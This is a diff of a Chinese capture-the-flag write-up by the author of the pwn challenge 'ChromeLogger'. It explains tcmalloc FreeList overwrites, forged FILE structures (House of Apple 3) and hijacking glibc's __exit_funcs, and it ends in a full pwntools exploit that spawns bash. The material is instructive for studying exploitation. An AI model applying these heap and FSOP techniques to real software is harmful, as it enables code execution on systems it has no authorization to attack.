@@ -226,7 +226,7 @@ tcmalloc是谷歌研发的，听说曾经用在Chromium上过，而对于浏览�
 > 也许我哪一天会再出一题考uaf或者和`free`有关的攻击，不过那就要等我读完源码了。
 
 想着直接堆溢出有点太无脑了，我就用到了大部分人只见过却没研究过的`setvbuf`。
-本来我的想法是利用将`stdout`和`stderr`的缓冲区堆块可以由pwner来分配，
+本来我的想法是让`stdout`和`stderr`的缓冲区堆块可以由pwner来分配，
 并且设置缓冲区大小为固定值，`stdout`和`stderr`的缓冲区各可以分配一次。
 此时如果将过小的堆块作为标准IO的缓冲区，那在做`puts`等IO操作时，
 就会发生堆溢出，将数据写到FreeList上。后来想想2次有点少了，
@@ -255,7 +255,7 @@ tcmalloc是谷歌研发的，听说曾经用在Chromium上过，而对于浏览�
 为了解决这个问题，可以规定如果堆块中连续的非'\0'字符中的最后一个是'\n'，
 则不对齐到8边界，而指针不可能高地址的字节是'\n'，因此对齐到8边界，
 这样就能很方便地控制写指针前的`write_ptr`，起到引入一个堆块用以调节`write_ptr`，
-然后下一个堆块就能把指针顺利写到FreeList上。这样`DisplayLogs`也设计好了。
+然后下一个堆块就能把指针顺利写到FreeList上的作用。这样`DisplayLogs`也设计好了。
 
 接下来就可以开始打了。考虑到本题并没有什么逆向上的考察，就保留了程序的符号。
 既然比赛已经结束了，我也会公开[源码](sources/ChromeLogger/)，可以边看源码边看我的思路。
@@ -276,9 +276,9 @@ tcmalloc是谷歌研发的，听说曾经用在Chromium上过，而对于浏览�
 
 由于`DisplayLogs`是根据`strlen`来计算输出长度，而不是根据堆块大小，因此把堆块写满后，
 就会和FreeList邻接，此时`DisplayLogs`会打印下下个要分配的堆块的地址，堆地址就轻松拿到了。
-当我想着用做glibc堆题的思路，去减去一个固定的偏移去计算堆基址时，却发生了SIGSEGV异常。
+当我想着用做glibc堆题的思路，去减去一个固定的偏移去计算堆基址时，却发现得不到想要的指针。
 多次调试发现堆基址竟然有50%的概率+0x1000，导致直接减偏移会有50%的概率打不通。
-接下来尝试分配任意堆块：先分配一个堆块调`write_ptr`，然后再分配一个用以写FreeList为堆基址+0x50，
+不管了，先尝试分配任意堆块：先分配一个堆块调`write_ptr`，然后再分配一个用以写FreeList为堆基址+0x50，
 那里有我们想要的指针。然后分配一个堆块作为`stdout`的缓冲区，并使用`DisplayLogs`实现FreeList覆盖。
 注意`setvbuf`时用的是`_IOFBF`，因此只有缓冲区满了才能向标准输出流打印信息，
 因此`sendafter`就不可用了，只能用`sleep`来控制时间输入。
@@ -322,3 +322,321 @@ forgedFile = flat({
 
 ![fake FILE](assets/fakeFile.png)
 
+根据写出的fakeFile，我最终指定后门可以`PTR_MANGLE`一个堆块+0x80处的指针，
+别忘了前面还有0x10的时间字符串！最终也是成功在本地起了bash。
+
+> [!TIP]
+> 还可以看到0xe0开始写了多个地址指向"bash"，
+> 这是因为`_IO_wfile_underflow`中有如下操作：
+> 
+> ```c
+> // glibc-2.38/source/libio/wfileops.c#L138
+>     fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
+>     fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
+>         fp->_wide_data->_IO_buf_base;
+> ```
+> 
+> 因此需要同时更改这几个字段，否则[rsi]的值就会被更改。像我这样子固定三个值后，
+> rsi将会是`forgedFileAddr + 0xe0`，[rsi]是`forgedFileAddr + 0x48`，[rsi]+8是NULL。
+
+## 诡异的堆偏移
+
+当我写完exp后，我就起了容器，看容器内运行能不能跑得通。结果直接EOF了。
+这怎么可能呢？！我在容器里装了gdb，然后attach到进程上调试，发现fakeFile的堆偏移变了，
+0x20堆块后面的FreeList也是空的。于是我就把exp中的泄露堆地址的堆块大小换成了0x30，
+然后在脚本里判断如果是本地就是什么偏移，在远程又是什么偏移...当我重新起容器，
+以为能打通的时候，又打不通了。更诡异的是，我一装上gdb，远程又能打通了。
+什么？tcmalloc怎么会和gdb有关系？我尝试最小复现这个现象，最后定位到了`tzdata`包，
+装了就正常，不装就报错。那就装着吧，大概能解决问题。等我改好了Dockerfile，
+又又又出新问题了：堆基址到0x30堆块的偏移发生了变化，拿之前的脚本怎么打都打不通。
+我让 *dbgbgtf* 试试，他说堆基址到0x30堆块的偏移没变。
+
+> [!TIP]
+> 当时担心等到题目上线时堆基址到0x30堆块的偏移会变，我又在代码里加了`SubmitTask`，
+> 通过任意堆块地址就可以获取堆基址，这样彻底解决了基址偏移的问题，不过一开始没启用。
+
+为了防止fakeFile的堆块反复偏移，我再次套了泄露堆地址的方法，泄露了0x160堆块的地址，
+计算出fakeFile的地址，这样就不用做固定偏移，避免了环境之间的差异。
+这样一来通用脚本就可以同时打通本地和远程了。
+
+## 预期中的非预期
+
+终于，测试的一天到了，buu上起了测试靶机，我一测试，坏了，堆基址到0x30堆块的偏移又变了！
+还好我做了准备直接启用`FALLBACK`宏重新编译ChromeLogger，直接给出堆基址，并微调脚本，
+还好这个“非预期”被我“预期”到了。
+
+之后安恒让我们测试题目是否有非预期解。之前我跳过了"exit_hook"有关的打法，
+因为我认为只能注册无参函数，无法控制rdi和rsi。此时我觉得万一rdi，rsi符合条件呢？
+我先测试了很多wp提到的`tls__dtor__list`，可惜，rsi是无效参数，rdi倒是可控，
+原先使用rbp寄存器作为中转的方案，很方便就能rop，不过libc 2.38改掉了，没有利用可能了。
+
+> [!NOTE]
+> tls的destructor的添加是通过`__cxa_thread_atexit_impl`函数实现的，
+> 并且是有一个`void *`的参数传给函数指针调用的，这个是我当时记错了。
+
+既然看`exit`了，不如把整个源码读一下。结果一读发现还真有新的"hook"：
+`__run_exit_handlers`中，每个 **exit_func** 都可以设置自己的类型，
+如果是`atexit`则没有可控参数；如果是`onexit`则rdi是退出状态码，
+rsi是可控参数；如果是`cxaexit`则rdi是可控参数，rsi是退出状态码。
+由于我们是正常退出，因此可以利用`cxaexit`构造`execvp("bash", NULL)`，
+同样可以拿shell。于是我改了改我的exp，用上了`cxaexit`，感觉比之前更好用，
+因为可以把"bash"直接写在libc上，不需要再分配堆块，不需要考虑堆偏移。
+这也算是被我预料到的非预期吧。
+
+```python
+# fake initial struct @ logs idx 12
+fakeInitial = flat({
+    0x38:   1,       # __new_exitfn_called
+    0x60:   1,       # initial+8
+    0x68:   4,
+    0x70:   libc.symbols['execvp'], # be mangled later
+    0x78:   initial - 0x68 + 11
+    }, filler=b'\0')
+```
+
+> [!TIP]
+> 讲讲这里hook的原理：`exit`会依次完成`__exit__funcs`中的回调函数，
+> 而`__exit__funcs`又指向`initial`结构体，改了`initial`中的函数回调，
+> 就能实现rip的控制。
+>
+> ```c
+> // glibc-2.38/source/stdlib/exit.c#L101
+>         case ef_cxa:
+>             /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
+>             we must mark this function as ef_free.  */
+>             f->flavor = ef_free;
+>             cxafct = f->func.cxa.fn;
+>             arg = f->func.cxa.arg;
+>             PTR_DEMANGLE (cxafct);
+> 
+>             /* Unlock the list while we call a foreign function.  */
+>             __libc_lock_unlock (__exit_funcs_lock);
+>             cxafct (arg, status);
+>             __libc_lock_lock (__exit_funcs_lock);
+>             break;
+> ```
+>
+> *（用了2.38的代码，不过和2.39没差的）*  
+> 当我写入`initial`后我还发现由于引入了C++库，`initial`中还有不少的函数指针，
+> 检查了一下发现是libstdc++、ld和libtcmalloc的回调函数，而libtcmalloc的基地址是我们已知的，
+> 因此理论上这道题甚至不需要给`PTR_MANGLE`，`fs:[0x30]`的值可以直接从`initial`中获取。
+>
+> <img src="assets/exitfuncs.png" height="80%" width="80%">
+>
+> *demangle后的`initial`上的部分函数指针*  
+> 根据以下法则就可以计算`fs:[0x30]`：
+> `ror(func, 0x11) ^ fs:[0x30] == mangled => fs:[0x30] == mangled ^ ror(func, 0x11)`
+
+最后我一开始在用Arch的库调试时看到了tcmalloc的NewHook和DeleteHook，
+也去验证了一下这些hook能不能同时控制2个参数，可惜NewHook和malloc挂钩，
+第一个参数是堆块地址，第二个参数是堆块大小，由于限制了size不能为0，
+因此rsi无法为有效值；而DeleteHook虽然可能出现符合条件的rsi（`(char *[]){NULL}`），
+但是rdi不可控（程序中没有`free`，也不能借由`scanf`调用），也无法利用。
+
+> [!NOTE]
+> `scanf`也会分配堆块释放堆块，这在不少wp中也有提到。比如我的题中就有读入`%d`，
+> 分配堆块释放堆块的条件就是有很长很长的数字，例如"000000...1"（省略2000个0），
+> 但是一旦中间出现非数字字符或'\0'，输入就会停止，因此无法控制释放的堆块内容刚好为"bash"。
+
+这样一来，非预期大概就没有了，“非预期”也变成“预期”了。
+
+## 完整EXPLOIT
+
+```python
+from pwn import *
+context.terminal = ['tmux','splitw','-h']
+context.arch = 'amd64'
+GOLD_TEXT  = lambda x: f'\x1b[33m{x}\x1b[0m'
+GREEN_TEXT = lambda x: f'\x1b[32m{x}\x1b[0m'
+EXE = './ChromeLogger'
+SLEEP = lambda : sleep(0.125)
+
+def payload(lo: int, useFSOP: bool) -> bool:
+    global sh
+    if lo:
+        if lo & 4:
+            sh = process([EXE + '.g', 'PRIVILEGED'])
+        else:
+            sh = process(EXE + '.xg')
+    else:
+        sh = remote('node5.buuoj.cn', 26500)
+    libc = ELF('./container/lib/libc.so.6')
+    libtcmalloc = ELF('./container/lib/libtcmalloc.so.4')
+
+    def dbg():
+        if lo & 2:
+            # gdb.attach(sh, 'b DisplayLogs\nb PTR_MANGLE\nc')
+            gdb.attach(sh, 'b execvp')
+            pause()
+
+    def newlog(size: int, asbuf: bool, log: bytes):
+        sh.sendline(b'1')
+        SLEEP()
+        sh.sendline(str(size).encode())
+        SLEEP()
+        sh.sendline(b'y' if asbuf else b'n')
+        SLEEP()
+        if not asbuf:
+            sh.send(log)
+            SLEEP()
+
+    def displaylog():
+        sh.sendline(b'2')
+        SLEEP()
+
+    def logout():
+        sh.sendline(b'3')
+        SLEEP()
+
+    def backdoor(register: bool, idx: int=0):
+        if register:
+            sh.sendline(b'4')
+            SLEEP()
+        else:
+            sh.sendline(str(idx).encode())
+            SLEEP()
+
+    def submit(heap: int) -> int:
+        sh.sendline(b'5')
+        sh.sendlineafter(b'HEAP', hex(heap).encode())
+        sh.recvuntil(b'are: ')
+        return int(sh.recv(14), 16)
+
+    newlog(48, False, b'First, let us leak the heap base out:')
+    displaylog()
+    sh.recvuntil(b'out:')
+    heap = u64(sh.recv(8))
+    success(f"Get basic heap addr: {heap:#x}")
+    heapBase = submit(heap)
+    success(GOLD_TEXT(f"Leak heap base: {heapBase:#x}"))
+
+    # 215 for alignment to make the addr on FreeList, 11 for timestr
+    newlog(256, False,                          # 1 for trailing \n
+           b'Write the addr on FreeList in tcmalloc via stdout, ' \
+           b'then alloc one chunk move the addr to thread cache, ' \
+           b'so the next chunk will be at the addr, i.e. ' \
+           b'arb malloc. Alloc near heap base to get tcmalloc.' \
+           .ljust(215 - 12) + b'\n')
+    newlog(48, False, b' ' * 5 + p64(heapBase + 0x50))
+    newlog(48, True, b'ignored') # overflowing 256 - 48 bytes
+    displaylog() # write into buf, trigger buffer overflow
+
+    newlog(48, False, b"Second, arb alloc for libtcmallocBase")
+    info(GREEN_TEXT(f"Alloc @ {heapBase + 0x50:#x} to get libtcmalloc"))
+    newlog(48, False, b"Crash, NULL required.")
+    displaylog()
+    displaylog() # we may display twice to see "required"
+
+    sh.recvuntil(b'required.')
+    tcmalloc = u64(sh.recv(8)) # get tcmalloc::Static::central_cache_+75408
+    libtcmallocBase = tcmalloc - 0x194f30 - 0x46000
+    success(GOLD_TEXT(f"Leak libtcmalloc base: {libtcmallocBase:#x}"))
+
+    libtcmalloc.address = libtcmallocBase
+    newlog(256, False, b'This challenge may be harder than I thought. ' \
+            b'Now this is another padding.'.ljust(253 - 12) + b'\n')
+    newlog(64, False, b' ' * 5 + p64(libtcmalloc.got['getpagesize'] - 16))
+    newlog(64, True, b'ignored')
+    displaylog()
+
+    newlog(64, False, b"Third, we alloc to libtcmalloc.got to leak libc")
+    info(GREEN_TEXT(f"Alloc @ {libtcmalloc.got['getpagesize'] - 16:#x} to get libc"))
+    newlog(64, False, b'LIBC:')
+
+    if useFSOP:
+        newlog(0x160, False, 
+                   b"Just a little bit of environment change commits to " \
+                   b"heap change. Installing tzdata could cause 512-byte chunk " \
+                   b"to have a different offset. I have to leak the offset, " \
+                   b"instead of just calculate the offset. See more detail " \
+                   b"about this challenge on my blog: https://rocketmadev.github.io" \
+                   .ljust(0x160 - 17) + b'OFFSET')
+
+    displaylog()
+    displaylog()
+    
+    sh.recvuntil(b'LIBC:')
+    libcBase = u64(sh.recv(8)) - libc.symbols['getpagesize']
+    success(GOLD_TEXT(f"Leak libc base: {libcBase:#x}"))
+    libc.address = libcBase
+    
+    if useFSOP:
+        sh.recvuntil(b'OFFSET')
+        forgedFileAddr = u64(sh.recv(8)) - 0x160 + 0x10 # skip time str
+        assert forgedFileAddr & 0xff != 0xa, "unexpected empty FreeList after 0x160-size chunk"
+        success(GOLD_TEXT(f"Leak forgedFileAddr: {forgedFileAddr:#x}"))
+        
+        # payload of IO according to House of Apple 3, @ logs idx 10
+        forgedFile = flat({
+            0:      0,  # file._flag
+            0x10:   1,  # file._IO_read_end
+            0x28:   1,  # file._IO_write_ptr
+            0x30:   forgedFileAddr + 0x48,                  # _codecvt->__cd_in.step
+            0x48:   b'bash',                                # step.__shlib_handle
+            0x70:   libc.symbols['execvp'],                 # step.__fct
+            0x88:   forgedFileAddr + 0x150,                 # file._lock
+            0x98:   forgedFileAddr + 0x30,                  # file._codecvt
+            0xa0:   forgedFileAddr + 0xe0,                  # file._wide_data 
+            0xd8:   libc.symbols['_IO_wfile_jumps'] + 8,    # file._vtable
+            0xe0:   forgedFileAddr + 0x48,                  # _wide_data._IO_read_ptr
+            0xe8:   forgedFileAddr + 0x48,                  # _wide_data._IO_read_end
+            0x110:  forgedFileAddr + 0x48,                  # _wide_data._IO_buf_base
+            }, filler=b'\0') # be careful! a lot operations in the procedure
+        newlog(0x160, False, b' ' * 5 + forgedFile)
+        dbg()
+
+        newlog(256, False, 
+                b'As we can PTR_MANGLE, we control rdi and rsi. ' \
+                b'rdi is "bash" and rsi is (char *[]){"bash", NULL}, ' \
+                b'bypassing rdi=="/bin/sh".' \
+                .ljust(0x93 - 12) + b'\n')
+        newlog(80, False, b' ' * 5 + p64(libc.symbols['_IO_list_all'] - 16))
+        newlog(80, True, b'ignored')
+        displaylog()
+
+        newlog(80, False, b"Finally, write forgedFileAddr on _IO_list_all")
+        info(GREEN_TEXT(f"Alloc @ {libc.symbols['_IO_list_all'] - 16:#x} to hijack IO"))
+        newlog(80, False, b' ' * 5 + p64(forgedFileAddr))
+        backdoorIdx = 10
+
+    else: # do not use FSOP
+        newlog(256, False, 
+                b'I found a new solution, writing __exit_funcs!' \
+                .ljust(0x65 - 12) + b'\n')
+        initial = libc.address + 0x204fc0
+        newlog(0xa0, False, b' ' * 5 + p64(initial - 0x68))
+        newlog(0xa0, True, b'ignored')
+        displaylog()
+
+        newlog(0xa0, False, b"Finally, write __exit_funcs to run execvp at exit")
+        info(GREEN_TEXT(f"Alloc @ {initial - 0x68:#x} to hijack exit"))
+        # fake initial struct @ logs idx 12
+        fakeInitial = flat({
+            0x38:   1,       # __new_exitfn_called
+            0x60:   1,       # initial+8
+            0x68:   4,
+            0x70:   libc.symbols['execvp'],
+            0x78:   initial - 0x68 + 11
+            }, filler=b'\0')
+        newlog(0xa0, False, b'bash\0' + fakeInitial)
+        backdoorIdx = 12
+
+    backdoor(True)
+    logout()
+    backdoor(False, backdoorIdx)
+
+    sh.clean()
+    sh.interactive()
+    sh.close()
+```
+
+## 尾声
+
+尽管放了提示，但是8小时，没有师傅能做出我的题，感觉有些遗憾。
+各位师傅有什么想问的都可以在discussion中问。
+
+## 参考
+
+1. [House of apple 一种新的glibc中IO攻击方法 (3) ](https://bbs.kanxue.com/thread-273863.htm)
+2. [Bypassing vtable Check in glibc File Structures](https://blog.kylebot.net/2022/10/22/angry-FSROP/)
+3. [failed to load pickle](https://github.com/Kyle-Kyle/angry-FSROP/issues/1)
